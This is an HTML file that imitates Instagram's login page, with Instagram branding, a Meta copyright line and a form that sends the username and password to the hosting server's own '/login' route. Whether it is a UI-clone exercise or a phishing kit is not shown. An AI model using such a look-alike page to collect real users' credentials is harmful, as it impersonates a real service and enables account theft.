<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <link rel="icon" href="assets/favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="assets/favicon.ico" type="image/x-icon">
    <link rel="icon" href="assets/favicon.png" type="image/png">
    <title>Instagram</title>
    <link rel="stylesheet" href="public/styles/style.css">
</head>
<body>
    <div class="container">
        <div class="login-container">
            <div class="login-box">
                <img class="instagram-logo" src="assets/instagram-logo.png" alt="Instagram">
                <form action="/login" method="POST">
                    <div class="input-group">
                        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
                    </div>
                    <div class="input-group">
                        <input type="password" id="password" name="password" placeholder="Password" required>
                    </div>
                    <button type="submit" class="login-button">Log in</button>
                    <div class="divider">
                        <span class="divider-line"></span>
                        <span class="divider-text">OR</span>
                        <span class="divider-line"></span>
                    </div>
                    <div class="facebook-login">
                        <img src="assets/facebook-icon.png" alt="Facebook">
                        <span>Log in with Facebook</span>
                    </div>
                    <a href="#" class="forgot-password">Forgot password?</a>
                </form>
            </div>
            <div class="signup-box">
                <p>Don't have an account? <a href="#">Sign up</a></p>
            </div>
            <div class="app-download">
                <p>Get the app.</p>
                <div class="app-buttons">
                    <a href="#"><img src="assets/googleplay.png" alt="Google Play"></a>
                    <a href="#"><img src="assets/microsoft.png" alt="Microsoft Store"></a>
                </div>
            </div>
        </div>
    </div>
    <footer>
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <a href="#">Meta Verified</a>
        </div>
        <div class="footer-meta">
            <span>English</span>
            <span>Â© 2025 Instagram from Meta</span>
        </div>
    </footer>
</body>
</html>
